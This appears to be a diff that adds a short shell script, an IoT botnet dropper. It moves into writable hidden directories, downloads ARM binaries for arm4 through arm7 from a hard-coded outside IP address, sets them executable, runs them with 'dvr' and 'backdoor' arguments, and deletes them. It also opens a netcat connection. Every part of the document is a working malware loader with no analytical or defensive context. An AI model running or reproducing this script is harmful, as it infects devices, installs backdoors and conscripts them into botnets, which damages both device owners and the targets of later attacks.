@@ -1,0 +1,19 @@
+>/tmp/.a && cd /tmp
+>/dev/shm/.a && cd /dev/shm
+>/dev/.a && cd /dev
+>/log/0/.a && cd /log/0
+
+rm -rf .a .f
+
+nc 127.0.0.1 1234 &
+
+wget http://95.214.27.202/s/arm7 -O- > .f; chmod 777 .f; ./.f dvr; rm -rf .f
+wget http://95.214.27.202/s/arm6 -O- > .f; chmod 777 .f; ./.f dvr; rm -rf .f
+wget http://95.214.27.202/s/arm5 -O- > .f; chmod 777 .f; ./.f dvr; rm -rf .f
+wget http://95.214.27.202/s/arm4 -O- > .f; chmod 777 .f; ./.f dvr; rm -rf .f
+
+wget http://95.214.27.202/z/arm7 -O- > .f; chmod 777 .f; ./.f backdoor; rm -rf .f
+wget http://95.214.27.202/z/arm6 -O- > .f; chmod 777 .f; ./.f backdoor; rm -rf .f
+wget http://95.214.27.202/z/arm5 -O- > .f; chmod 777 .f; ./.f backdoor; rm -rf .f
+wget http://95.214.27.202/z/arm4 -O- > .f; chmod 777 .f; ./.f backdoor; rm -rf .f
+
